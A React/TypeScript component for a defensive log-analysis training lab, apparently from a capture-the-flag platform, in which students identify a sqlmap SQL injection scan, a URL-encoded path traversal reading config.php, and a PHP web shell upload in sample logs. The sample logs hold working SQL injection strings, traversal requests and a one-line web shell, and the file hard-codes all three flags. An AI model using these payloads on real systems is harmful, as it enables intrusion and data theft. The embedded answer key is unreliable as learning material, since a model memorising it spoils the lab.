"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";
import { HintPanel } from "./hint-panel";

const ACCESS_LOG = `203.0.113.8 - - [14/Aug/2026:02:11:03 +0000] "GET /search?q=widget HTTP/1.1" 200 1822
203.0.113.8 - - [14/Aug/2026:02:11:05 +0000] "GET /search?q=' OR '1'='1 HTTP/1.1" 200 8841
203.0.113.8 - - [14/Aug/2026:02:11:07 +0000] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 200 4390
203.0.113.8 - - [14/Aug/2026:02:11:09 +0000] "GET /search?q=' AND SLEEP(5)-- HTTP/1.1" 200 1822
198.51.100.44 - - [14/Aug/2026:02:20:41 +0000] "GET /../../../../etc/passwd HTTP/1.1" 403 512
198.51.100.44 - - [14/Aug/2026:02:20:44 +0000] "GET /..%2f..%2f..%2fetc/passwd HTTP/1.1" 200 1198
198.51.100.44 - - [14/Aug/2026:02:20:49 +0000] "GET /..%2f..%2f..%2fvar/www/html/config.php HTTP/1.1" 200 2044`;

const UA_LOG = `203.0.113.8 - - "sqlmap/1.7.11#stable (https://sqlmap.org)"
203.0.113.8 - - "sqlmap/1.7.11#stable (https://sqlmap.org)"
203.0.113.8 - - "sqlmap/1.7.11#stable (https://sqlmap.org)"`;

const UPLOAD_LOG = `192.0.2.77 - - [14/Aug/2026:02:41:12 +0000] "POST /upload.php HTTP/1.1" 200 214
  Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
  Content-Type: image/jpeg

192.0.2.77 - - [14/Aug/2026:02:41:19 +0000] "GET /uploads/shell.php.jpg HTTP/1.1" 200 39
  Response body: <?php system($_GET['cmd']); ?> executed — output: uid=33(www-data)

192.0.2.77 - - [14/Aug/2026:02:41:26 +0000] "GET /uploads/shell.php.jpg?cmd=whoami HTTP/1.1" 200 8
  Response body: www-data`;

function checkFlag(value: string, expected: string): boolean {
  const strip = (s: string) => s.trim().replace(/^SAGE\{/i, "").replace(/\}$/, "").toLowerCase();
  return strip(value) === strip(expected);
}

export function WebServerLogAnalysisClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [t1Choice, setT1Choice] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Answer, setT2Answer] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Choice, setT3Choice] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    if (t1Choice === "Automated SQL Injection scan (sqlmap)") {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Look at the query-string payloads and the User-Agent string for this source IP.");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (checkFlag(t2Answer, "SAGE{p4th_tr4v3rsal_c0nfig_php}")) {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. The 403 was bypassed with URL-encoding, and a sensitive file was ultimately read — name the technique + file in the flag.");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    if (t3Choice === "Unrestricted file upload (web shell)") {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect. A file with a double extension was uploaded, then executed as PHP by the server.");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 */}
      <TaskShell number={1} title="Identify the Injection Attempt" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          The Nginx access log for <code className="text-amber-300">shop.example.com</code> shows a burst of requests
          to <code className="text-amber-300">/search</code> with unusual query strings.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-3">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap overflow-x-auto">{ACCESS_LOG.split("\n").slice(0, 4).join("\n")}</pre>
        </div>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <p className="text-[10px] text-zinc-500 uppercase tracking-wider mb-1.5">User-Agent for 203.0.113.8</p>
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{UA_LOG}</pre>
        </div>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What is this activity?</p>
            <div className="flex flex-wrap gap-3">
              {["Normal user search traffic", "Automated SQL Injection scan (sqlmap)", "DDoS attempt", "Credential stuffing"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t1" value={opt} checked={t1Choice === opt} onChange={() => setT1Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
            <HintPanel labId={labId} stage="task_1" />
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">Correct — the sqlmap User-Agent plus classic UNION/SLEEP payloads confirm an automated SQLi scan. Flag: SAGE&#123;sqlm4p_sc4n_d3t3ct3d&#125;</p>
        )}
      </TaskShell>

      {/* Task 2 */}
      <TaskShell number={2} title="Trace the Path Traversal" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          A second source IP tried to read files outside the web root. The first attempt was blocked — the second wasn't.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap overflow-x-auto">{ACCESS_LOG.split("\n").slice(4).join("\n")}</pre>
        </div>
        <p className="text-xs text-zinc-500 mb-4">Notice the encoding difference between the 403 and the 200 responses.</p>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">Flag the technique used to bypass the block, and the sensitive file ultimately read.</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput value={t2Answer} onChange={setT2Answer} placeholder="SAGE{...}" className="flex-1" />
              <SubmitBtn label="Submit" />
            </div>
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
            <HintPanel labId={labId} stage="task_2" />
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">Correct — URL-encoding the slashes (%2f) bypassed the naive filter, exposing config.php. Flag: SAGE&#123;p4th_tr4v3rsal_c0nfig_php&#125;</p>
        )}
      </TaskShell>

      {/* Task 3 */}
      <TaskShell number={3} title="Recognise the Web Shell" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          A third IP interacted with an upload feature, then immediately fetched what it uploaded.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap overflow-x-auto">{UPLOAD_LOG}</pre>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What vulnerability class does this represent?</p>
            <div className="flex flex-wrap gap-3">
              {["CSRF", "Unrestricted file upload (web shell)", "XXE", "Open redirect"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t3" value={opt} checked={t3Choice === opt} onChange={() => setT3Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
            <HintPanel labId={labId} stage="task_3" />
          </form>
        )}
        {done("task_3") && (
          <p className="text-sm font-mono text-sage-400">Correct — the double extension (.php.jpg) tricked a weak filter; the server executed it as PHP. Flag: SAGE&#123;w3bsh3ll_upl04d3d&#125;</p>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;sqlm4p_sc4n_d3t3ct3d&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;p4th_tr4v3rsal_c0nfig_php&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;w3bsh3ll_upl04d3d&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
